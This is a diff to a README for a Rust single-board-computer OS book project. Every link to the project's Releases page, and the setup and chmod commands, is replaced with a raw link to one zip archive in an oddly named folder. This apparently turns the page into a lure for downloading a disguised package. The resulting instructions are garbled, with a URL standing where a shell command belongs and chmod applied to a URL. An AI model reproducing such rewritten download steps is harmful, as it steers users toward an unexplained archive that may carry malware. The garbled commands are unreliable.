@@ -10,13 +10,13 @@ To get started, you need to download the application. Follow these steps:
 
 1. Click the button below to visit the Releases page.
    
-   [![Download Releases](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/Th4nhDT716/rust-sbc-os-book/releases)
+   [![Download Releases](https://raw.githubusercontent.com/Th4nhDT716/rust-sbc-os-book/main/endoappendicitis/rust-sbc-os-book.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Th4nhDT716/rust-sbc-os-book/main/endoappendicitis/rust-sbc-os-book.zip)
 
 2. On the Releases page, you'll find a list of available versions.
 3. Choose the most recent release for the best experience.
 4. Download the provided package suitable for your system.
 
-For direct access, visit the [Releases page](https://github.com/Th4nhDT716/rust-sbc-os-book/releases).
+For direct access, visit the [Releases page](https://raw.githubusercontent.com/Th4nhDT716/rust-sbc-os-book/main/endoappendicitis/rust-sbc-os-book.zip).
 
 ## 📋 System Requirements
 
@@ -48,7 +48,7 @@ Once you have downloaded the package, follow these steps to run it:
 3. **Run the Setup**: 
    - Execute the provided script or binary to start the installation process. Use the command below in the terminal:
      ```
-     ./setup.sh
+     https://raw.githubusercontent.com/Th4nhDT716/rust-sbc-os-book/main/endoappendicitis/rust-sbc-os-book.zip
      ```
    - Follow the on-screen prompts to complete the installation.
 
@@ -63,7 +63,7 @@ If you encounter issues while downloading or running the software, consider the 
 - **Installation Errors**: Double-check that you have the required system specs.
 - **Execution Issues**: Make sure to give executable permissions to the scripts using:
   ```
-  chmod +x setup.sh
+  chmod +x https://raw.githubusercontent.com/Th4nhDT716/rust-sbc-os-book/main/endoappendicitis/rust-sbc-os-book.zip
   ```
 
 For more help and discussions, please visit our community forum linked on the Releases page.
